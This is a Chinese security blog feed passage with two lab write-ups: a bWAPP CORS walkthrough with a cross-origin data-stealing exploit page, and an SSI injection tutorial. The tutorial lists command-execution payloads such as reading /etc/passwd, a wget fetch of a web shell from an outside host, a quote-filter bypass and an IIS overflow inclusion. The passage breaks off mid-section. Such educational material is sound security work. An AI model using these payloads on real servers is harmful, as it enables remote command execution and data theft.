    <content type="html"><![CDATA[<p>这里做下BWAPP靶场的Cross-Origin Resource Sharing (AJAX)的题目。</p><h2 id="0x01-Low级"><a href="#0x01-Low级" class="headerlink" title="0x01 Low级"></a>0x01 Low级</h2><p>正常用户登录后访问页面，提示尝试从恶意站点去通过Ajax请求来窃取Neo的秘密：</p><p><img src="/2019/09/28/bWAPP之Cross-Origin-Resource-Sharing-AJAX/11.png" alt=""></p><p>这里用户可以点击“secret”去查看Neo的秘密，并且可看到该页面响应报文的ACAO字段设置为*，但并未设置ACAC字段（想必是避免浏览器最后一道防线吧）：</p><p><img src="/2019/09/28/bWAPP之Cross-Origin-Resource-Sharing-AJAX/12.png" alt=""></p><p>接着，我们可以直接编写我们的CORS跨域漏洞的Exp，因为无ACAC头，即无需带Cookie访问，因此直接将withCredentials那句注释掉就好：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello I evil page. <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">loadXMLDoc</span><span class="params">()</span></span></span></span><br><span class="line"><span class="undefined">&#123;</span></span><br><span class="line"><span class="actionscript">   <span class="keyword">var</span> xhr1;</span></span><br><span class="line"><span class="javascript">   <span class="keyword">if</span>(<span class="built_in">window</span>.XMLHttpRequest)</span></span><br><span class="line"><span class="undefined">   &#123;</span></span><br><span class="line"><span class="actionscript">       xhr1 = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="undefined">   &#125;</span></span><br><span class="line"><span class="actionscript">   <span class="keyword">else</span></span></span><br><span class="line"><span class="undefined">   &#123;</span></span><br><span class="line"><span class="actionscript">       xhr1 = <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span></span><br><span class="line"><span class="undefined">   &#125;</span></span><br><span class="line"><span class="actionscript">   xhr1.onreadystatechange=<span class="function"><span class="keyword">function</span><span class="params">()</span></span></span></span><br><span class="line"><span class="undefined">   &#123;</span></span><br><span class="line"><span class="actionscript">       <span class="keyword">if</span>(xhr1.readyState == <span class="number">4</span> &amp;&amp; xhr1.status == <span class="number">200</span>) <span class="comment">//if receive xhr1 response</span></span></span><br><span class="line"><span class="undefined">       &#123;</span></span><br><span class="line"><span class="actionscript">           <span class="keyword">var</span> datas=xhr1.responseText;</span></span><br><span class="line"><span class="undefined">           alert(datas);</span></span><br><span class="line"><span class="undefined">       &#125;</span></span><br><span class="line"><span class="undefined">   &#125;</span></span><br><span class="line"><span class="actionscript">   xhr1.open(<span class="string">"GET"</span>,<span class="string">"http://192.168.17.147/bWAPP/secret-cors-1.php"</span>,<span class="string">"true"</span>) <span class="comment">//request user page.</span></span></span><br><span class="line"><span class="actionscript">   <span class="comment">//xhr1.withCredentials = true;        //request with cookie</span></span></span><br><span class="line"><span class="undefined">   xhr1.send();</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">loadXMLDoc();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将其放置在攻击者服务器上，诱使已登录用户访问，然后就能窃取Neo的秘密信息了：</p><p><img src="/2019/09/28/bWAPP之Cross-Origin-Resource-Sharing-AJAX/13.png" alt=""></p><h2 id="0x02-Medium级"><a href="#0x02-Medium级" class="headerlink" title="0x02 Medium级"></a>0x02 Medium级</h2><p>确实是升级了，且给了提示说秘密信息只能让来自intranet.itsecgames.com域名的请求访问：</p><p><img src="/2019/09/28/bWAPP之Cross-Origin-Resource-Sharing-AJAX/14.png" alt=""></p><p>直接点击“srcret”访问是查看不到秘密信息的，因为此时请求的来源是BWAPP自己的域名而非intranet.itsecgames.com域名：</p><p><img src="/2019/09/28/bWAPP之Cross-Origin-Resource-Sharing-AJAX/15.png" alt=""></p><p>因此，若想成功访问该页面的秘密信息，我们需要添加Origin头字段并赋值为intranet.itsecgames.com域名：</p><p><img src="/2019/09/28/bWAPP之Cross-Origin-Resource-Sharing-AJAX/16.png" alt=""></p><p>接着，可能第一时间会想到，在Low级的EXP基础上，添加一条XHR设置请求头字段的语句，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xhr1.setRequestHeader(&quot;Origin&quot;, &quot;http://intranet.itsecgames.com&quot;);</span><br></pre></td></tr></table></figure><p>然而，这样是行不通的，为啥？——<strong>因为XHR请求头并不是什么字段都可以设置的，在W3C标准里面明确规定了以下请求头信息是由浏览器控制的，开发者是不允许设置这些请求头字段的，且不区分大小写</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Accept-Charset</span><br><span class="line">Accept-Encoding</span><br><span class="line">Access-Control-Request-Headers</span><br><span class="line">Access-Control-Request-Method</span><br><span class="line">Connection</span><br><span class="line">Content-Length</span><br><span class="line">Cookie</span><br><span class="line">Cookie2</span><br><span class="line">Date</span><br><span class="line">DNT</span><br><span class="line">Expect</span><br><span class="line">Host</span><br><span class="line">Keep-Alive</span><br><span class="line">Origin</span><br><span class="line">Referer</span><br><span class="line">TE</span><br><span class="line">Trailer</span><br><span class="line">Transfer-Encoding</span><br><span class="line">Upgrade</span><br><span class="line">User-Agent</span><br><span class="line">Via</span><br><span class="line">Proxy-xxx</span><br><span class="line">Sec-xxx</span><br></pre></td></tr></table></figure><p>目前本人想到的解决办法就是注册该域名，这里本地测试就该hosts文件来实现：</p><p><img src="/2019/09/28/bWAPP之Cross-Origin-Resource-Sharing-AJAX/18.png" alt=""></p><p>然后exp.html和Low级是一模一样的，只是修改了想要窃取数据的页面地址为secret-cors-2.php：</p><p><img src="/2019/09/28/bWAPP之Cross-Origin-Resource-Sharing-AJAX/17.png" alt=""></p><h2 id="0x03-High级"><a href="#0x03-High级" class="headerlink" title="0x03 High级"></a>0x03 High级</h2><p>最后看下High级，提示不信任本地内网区域：</p><p><img src="/2019/09/28/bWAPP之Cross-Origin-Resource-Sharing-AJAX/19.png" alt=""></p><p>用户是可以直接访问得到秘密信息的，且可以看到并未设置ACAO头字段：</p><p><img src="/2019/09/28/bWAPP之Cross-Origin-Resource-Sharing-AJAX/20.png" alt=""></p><p>没有ACAO字段，也就是说不允许CORS进行跨域访问了，因此就不存在CORS跨域漏洞了。</p><h2 id="0x04-源码分析"><a href="#0x04-源码分析" class="headerlink" title="0x04 源码分析"></a>0x04 源码分析</h2><p>最后从代码层面看下吧。</p><p>sm_cors.php的关键代码如下，根据不同的级别引用不同的PHP文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>($_COOKIE[<span class="string">"security_level"</span>])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"0"</span> :</span><br><span class="line">        $hero = <span class="string">"Neo"</span>;</span><br><span class="line">        $file = <span class="string">"secret-cors-1.php"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"1"</span> :</span><br><span class="line">        $hero = <span class="string">"Wolverine"</span>;</span><br><span class="line">        $file = <span class="string">"secret-cors-2.php"</span>;</span><br><span class="line">$hint = <span class="string">"HINT: the secret is only available to requests from intranet.itsecgames.com..."</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"2"</span> :</span><br><span class="line">        $hero = <span class="string">"Johnny"</span>;</span><br><span class="line">        $file = <span class="string">"secret-cors-3.php"</span>;</span><br><span class="line">$hint = <span class="string">"HINT: never trust local intranet zones!"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span> :</span><br><span class="line"></span><br><span class="line">        $hero = <span class="string">"Neo"</span>;</span><br><span class="line">        $file = <span class="string">"secret-cors-1.php"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分别看下几个不同级别的PHP文件。</p><p>Low级，secret-cors-1.php，设置ACAO字段值为*且无ACAC字段，允许任何外域访问该页面并无需携带cookie，典型的CORS跨域漏洞：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Type: text/plain"</span>);</span><br><span class="line">header(<span class="string">'Access-Control-Allow-Origin: *'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Neo's secret: Oh why didn't I took that BLACK pill?"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Medium级，secret-cors-2.php，检查请求头是否存在Origin字段且其值是否为<code>http://intranet.itsecgames.com</code>，同时设置响应报文头ACAO字段也为该域名：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Type: text/plain"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">"HTTP_ORIGIN"</span>]) <span class="keyword">and</span> $_SERVER[<span class="string">"HTTP_ORIGIN"</span>] == <span class="string">"http://intranet.itsecgames.com"</span>)</span><br><span class="line">&#123;</span><br><span class="line">    header(<span class="string">"Access-Control-Allow-Origin: http://intranet.itsecgames.com"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Wolverine's secret: What's a Magneto?"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"This is just a normal page with no secrets :)"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>High级，secret-cors-3.php，未设置ACAO头字段，不允许跨域访问该页面，当然就不存在CORS跨域漏洞了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Type: text/plain"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Johnny's secret: I'm the Ghost Rider!"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>小结一下：bWAPP靶场CORS题目并未涉及到带cookie访问，即未设置ACAC字段，可以说是是方便Low级的攻击利用，而在Medium级可自行添加ACAC字段来尝试看下区别，这里就不多说了。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="WriteUp:Web" scheme="https://www.mi1k7ea.com/categories/WriteUp-Web/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="CORS" scheme="https://www.mi1k7ea.com/tags/CORS/"/>
    
  </entry>
  
  <entry>
    <title>SSI注入漏洞总结</title>
    <link href="https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>https://www.mi1k7ea.com/2019/09/28/SSI注入漏洞总结/</id>
    <published>2019-09-28T03:47:16.000Z</published>
    <updated>2019-09-28T12:45:44.153Z</updated>
    
    <content type="html"><![CDATA[<p>现在大多数Web服务已经很少用到SSI了，但是偶尔还是能碰碰运气的。</p><h2 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h2><h3 id="何为SSI"><a href="#何为SSI" class="headerlink" title="何为SSI"></a>何为SSI</h3><p>SSI全称是Server Side Includes，即服务器端包含，是一种基于服务器端的网页制作技术。</p><p>SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。</p><p>基本原理就是：<strong>SSI在HTML文件中，可以通过注释行调用命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。</strong></p><h3 id="SHTML文件"><a href="#SHTML文件" class="headerlink" title="SHTML文件"></a>SHTML文件</h3><p>SHTML即Server-Parsed HTML。</p><p>shtml文件（还有stm、shtm文件）就是应用了SSI技术的html文件，所以在.shtml页面返回到客户端前，页面中的SSI指令将被服务器解析。可以使用SSI指令将其它文件、图片包含在页面中，也可以将其它的CGI程序包含在页面中，如.aspx文件。在给客户端返回的页面中不会包含SSI指令。如果SSI指令不能被解析，则浏览器会将其做为普通的HTML注释处理。</p><h3 id="Web服务启动SSI"><a href="#Web服务启动SSI" class="headerlink" title="Web服务启动SSI"></a>Web服务启动SSI</h3><h4 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h4><p>在Nginx中，开启SSI只需在配置文件中添加如下几项：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssi on;</span><br><span class="line">ssi_silent_errors off;</span><br><span class="line">ssi_types text/shtml;</span><br></pre></td></tr></table></figure><p>如：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">server&#123;</span><br><span class="line"><span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line"><span class="attribute">server_name</span> www.hello.com</span><br><span class="line"><span class="comment"># 配置SSL</span></span><br><span class="line">ssi <span class="literal">on</span>; <span class="comment"># 开启SSI支持</span></span><br><span class="line"><span class="attribute">ssi_silent_errors</span> <span class="literal">on</span>; <span class="comment"># 默认为off，设置为on则在处理SSI文件出错时不输出错误信息</span></span><br><span class="line"><span class="attribute">ssi_types</span> text/html; <span class="comment"># 需要支持的shtml 默认是 text/html</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">location</span> / &#123;</span><br><span class="line"><span class="attribute">root</span> html;</span><br><span class="line"><span class="attribute">index</span> index.html index.htm;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h4><p>修改Apache配置文件httpd.conf：</p><p>1、确认加载include.so模块，将注释去掉：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LoadModule include_module libexec/apache2/mod_include.so</span><br></pre></td></tr></table></figure><p>2、AddType部分去掉这两段注释：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType text/html .shtml</span><br><span class="line">AddOutputFilter INCLUDES .shtml</span><br></pre></td></tr></table></figure><p>3、Directory目录权限里面找到<code>Options Indexes FollowSymLinks</code>，并增加Includes修改为<code>Options Indexes FollowSymLinks Includes</code>；</p><p>4、重新启动Apache；</p><h4 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h4><p>不同版本的Windows下配置有所区别，具体的参考下资料就好：</p><p><a href="https://www.cnblogs.com/liuzhibin/p/5386454.html" target="_blank" rel="noopener">win7下使用IIS服务器及自定义服务器端包含模块（SSI）步骤</a></p><p><a href="https://www.jb51.net/article/20312.htm" target="_blank" rel="noopener">IIS SHTML支持设置方法（SSI）</a></p><h3 id="SSI基本语法"><a href="#SSI基本语法" class="headerlink" title="SSI基本语法"></a>SSI基本语法</h3><p>在SHTML文件中SSI标签使用的几种基本语法如下，必须注意的是其语法格式必须是以html的注释符<code>&lt;!--</code>开头、且后面紧接#符号和SSI命令，它们期间不能存在空格：</p><p><strong>1、显示服务器端环境变量<code>&lt;#echo&gt;</code></strong></p><p>本文档名称：<code>&lt;!--#echo var=&quot;DOCUMENT_NAME&quot;--&gt;</code></p><p>现在时间：<code>&lt;!--#echo var=&quot;DATE_LOCAL&quot;--&gt;</code></p><p>显示IP地址：<code>&lt;!--#echo var=&quot;REMOTE_ADDR&quot;--&gt;</code></p><p><strong>2、将文本内容直接插入到文档中<code>&lt;#include&gt;</code></strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#include file=&quot;文件名称&quot;--&gt;</span><br><span class="line">&lt;!--#include virtual=&quot;index.html&quot; --&gt;</span><br><span class="line">&lt;!--#include virtual=&quot;文件名称&quot;–&gt;</span><br><span class="line">&lt;!--#include virtual=&quot;/www/footer.html&quot; --&gt;</span><br></pre></td></tr></table></figure><p>注：file包含文件可以在同一级目录或其子目录中，但不能在上一级目录中，virtual包含文件可以是Web站点上的虚拟目录的完整路径。</p><p><strong>3、显示WEB文档相关信息<code>&lt;#flastmod&gt;&lt;#fsize&gt;</code>(如文件制作日期/大小等)</strong></p><p>文件最近更新日期：<code>&lt;! #flastmod file=&quot;文件名称&quot;–&gt;</code></p><p>文件的长度：<code>&lt;!--#fsize file=&quot;文件名称&quot;--&gt;</code></p><p><strong>4、直接执行服务器上的各种程序<code>&lt;#exec&gt;</code>(如CGI或其他可执行程序)</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!–#exec cmd=&quot;文件名称&quot;–&gt;</span><br><span class="line">&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--</span><br><span class="line">&lt;!–#exec cgi=&quot;文件名称&quot;–&gt;</span><br><span class="line">&lt;!--#exec cgi=&quot;/cgi-bin/access_log.cgi&quot;–&gt;</span><br></pre></td></tr></table></figure><p>将某一外部程序的输出插入到页面中。可插入CGI程序或者是常规应用程序的输入，这取决于使用的参数是cmd还是CGI。</p><p><strong>5、设置SSI信息显示格式<code>&lt;#config&gt;</code>(如文件制作日期/大小显示方式)</strong></p><p><strong>6、高级SSI可设置变量使用if条件语句</strong></p><h2 id="0x02-SSI注入漏洞"><a href="#0x02-SSI注入漏洞" class="headerlink" title="0x02 SSI注入漏洞"></a>0x02 SSI注入漏洞</h2><h3 id="何为SSI注入"><a href="#何为SSI注入" class="headerlink" title="何为SSI注入"></a>何为SSI注入</h3><p>SSI注入全称Server-Side Includes Injection，即服务端包含注入。在stm、shtm、shtml等Web页面中，如果用户可以从外部输入SSI标签，而输入的内容会显示到上述后缀的Web页面时，就导致可以远程在Web应用中注入脚本来执行代码。</p><p>简单点说就是攻击者可以通过外部输入SSI标签到Web页面（stm、shtm、shtml文件）来动态执行代码。</p><p>SSI注入允许远程在Web应用中注入脚本来执行代码。简单点说就是攻击者可以通过外部输入SSI语句到Web页面来动态执行代码。</p><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p>攻击者要想进行SSI注入、在Web服务器上运行任意命令，需要满足下列几点前提条件才能成功：</p><ol><li>Web服务器支持并开启了SSI；</li><li>Web应用程序在返回HTML页面时，嵌入了用户输入的内容；</li><li>外部输入的参数值未进行有效的过滤；</li></ol><h3 id="漏洞场景"><a href="#漏洞场景" class="headerlink" title="漏洞场景"></a>漏洞场景</h3><p>一般地，在stm、shtm、shtml等文件中，存在XSS的页面，大概率是存在SSI注入漏洞的。也就是说，用户输入的内容会显示在页面中的场景。比如，一个存在反射型XSS漏洞的页面，如果输入的payload不是XSS代码而是SSI的标签，同时服务器又开启了对SSI的支持的话就会存在SSI注入漏洞。</p><p>从定义中看出，页面中有一小部分是动态输出的时候使用SSI，比如：</p><ul><li>文件相关的属性字段</li><li>当前时间</li><li>访客IP</li><li>调用CGI程序</li></ul><h3 id="SSI注入常用命令"><a href="#SSI注入常用命令" class="headerlink" title="SSI注入常用命令"></a>SSI注入常用命令</h3><p>这里可以参考OWASP的说明：<a href="https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection" target="_blank" rel="noopener">https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection</a></p><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p><strong>Linux</strong></p><p>列出目录文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd=&quot;ls&quot; --&gt;</span><br></pre></td></tr></table></figure><p>访问目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd=&quot;cd /root/dir/&quot;&gt;</span><br></pre></td></tr></table></figure><p>执行脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd=&quot;wget http://mysite.com/shell.txt | rename shell.txt shell.php&quot; --&gt;</span><br></pre></td></tr></table></figure><p><strong>Windows</strong></p><p>列出目录文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd=&quot;dir&quot; --&gt;</span><br></pre></td></tr></table></figure><p>访问目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd=&quot;cd C:\admin\dir&quot;&gt;</span><br></pre></td></tr></table></figure><h4 id="访问与设置服务器信息"><a href="#访问与设置服务器信息" class="headerlink" title="访问与设置服务器信息"></a>访问与设置服务器信息</h4><p>更改错误消息输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#config errmsg=&quot;File not found, informs users and password&quot;--&gt;</span><br></pre></td></tr></table></figure><p>显示当前文档的文件名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#echo var=&quot;DOCUMENT_NAME&quot; --&gt;</span><br></pre></td></tr></table></figure><p>显示虚拟路径和文件名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#echo var=&quot;DOCUMENT_URI&quot; --&gt;</span><br></pre></td></tr></table></figure><p>使用“ config”命令和“ timefmt”参数，可以控制日期和时间输出格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#config timefmt=&quot;A %B %d %Y %r&quot;--&gt;</span><br></pre></td></tr></table></figure><p>使用“ fsize”命令，可以打印所选文件的大小：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#fsize file=&quot;ssi.shtml&quot; --&gt;</span><br></pre></td></tr></table></figure><h4 id="ssinc-dll缓冲区溢出漏洞"><a href="#ssinc-dll缓冲区溢出漏洞" class="headerlink" title="ssinc.dll缓冲区溢出漏洞"></a>ssinc.dll缓冲区溢出漏洞</h4><p>在IIS的4.0和5.0版本中，攻击者可以通过动态链接库（ssinc.dll）中的缓冲区溢出故障来获取系统特权。ssinc.dll是用于解释服务器端包含文件的程序。</p><p>通过创建包含以下SSI代码的恶意页面并强制Web应用加载该页面（ 路径遍历攻击），可以执行以下攻击：</p><p>ssi_over.shtml：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#include file=&quot;UUUUUUUU...UU&quot;--&gt;</span><br></pre></td></tr></table></figure><p>注意，字符U的数量必须大于2049。</p><p>强制Web应用加载ssi_over.shtml页面：</p><p>正常网站：<code>www.vulnerablesite.org/index.asp?page=news.asp</code></p><p>恶意网站：<code>www.vulnerablesite.org/index.asp?page=www.malicioussite.com/ssi_over.shtml</code></p><p>如果IIS返回空白页，则表明发生了溢出。在这种情况下，攻击者可能会操纵过程流并执行任意代码。</p><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>下面直接看BWAPP的SSI注入漏洞环境。</p><h4 id="Low级"><a href="#Low级" class="headerlink" title="Low级"></a>Low级</h4><p>页面是个表单，可以输入First name和Last name，然后提交来查询你的IP地址：</p><p><img src="/2019/09/28/SSI注入漏洞总结/1.png" alt=""></p><p>随便输入些内容点击Lookup，跳转至新的页面：</p><p><img src="/2019/09/28/SSI注入漏洞总结/2.png" alt=""></p><p>可看到该页面是shtml页面，并且用户输入的表单信息直接输出在该页面上。</p><p>当然，我们输入XSS payload，就会弹框了，后台没有进行任何过滤：</p><p><img src="/2019/09/28/SSI注入漏洞总结/3.png" alt=""></p><p><img src="/2019/09/28/SSI注入漏洞总结/4.png" alt=""></p><p>这就满足前面所说的场景了，该页面是SHTML文件，且存在反射型XSS，同时我们可以推测服务端是开启SSI的（因为对IP地址进行了查询操作并输出在页面上），那么该页面时大概率存在SSI注入漏洞的。</p><p>下面来验证一下，直接输入执行系统命令的SSI标签：</p><p><code>&lt;!--#exec cmd=&quot;whoami&quot;--&gt;</code></p><p><img src="/2019/09/28/SSI注入漏洞总结/5.png" alt=""></p><p><img src="/2019/09/28/SSI注入漏洞总结/6.png" alt=""></p><p>据此，我们就可以知道，下面显示lookup结果的IP地址的SSI标签为<code>&lt;!--#echo var=&quot;REMOTE_ADDR&quot;--&gt;</code>。</p><h4 id="Medium级"><a href="#Medium级" class="headerlink" title="Medium级"></a>Medium级</h4><p>该级别下XSS不能通过引号来将字符串括起来再弹框输出，因为后台程序在引号前添加了反斜杠进行了转义：</p><p><img src="/2019/09/28/SSI注入漏洞总结/10.png" alt=""></p><p>但是输入数字和用/括起来的字符串还是能正常输出的：</p><p><img src="/2019/09/28/SSI注入漏洞总结/11.png" alt=""></p><p>即目前可知，后台程序对引号都进行了转义的出来。</p><p>意料之中，Low级SSI注入的payload输进去后没执行成功：</p><p><img src="/2019/09/28/SSI注入漏洞总结/7.png" alt=""></p><p>一个个字符尝试，从XSS能注入的话是发现尖括号<code>&lt;&gt;</code>是没有被过滤的；接着对着之前的payload逐个字符去掉，发现将双引号去掉就能执行了：</p><p><code>&lt;!--#exec cmd=whoami --&gt;</code></p><p><img src="/2019/09/28/SSI注入漏洞总结/8.png" alt=""></p><p>虽然可以执行whoami命令，但是对于需要参数输入的命令是没办法执行了的，因为没有引号将整条命令括起来而中间存在空格，这样后台是没办法识别出整条命令的。</p><p>那么尝试将双引号替换为单引号，同样失效；这时可以想象平时进行命令注入利用的时候，我们可以利用哪些特殊字符，如换行符\n、反引号`、分号;、管道符|、与运算符&amp;等等，逐一尝试，最后发现反引号成功执行命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd=`cat /etc/passwd`--&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/09/28/SSI注入漏洞总结/9.png" alt=""></p><h4 id="High级"><a href="#High级" class="headerlink" 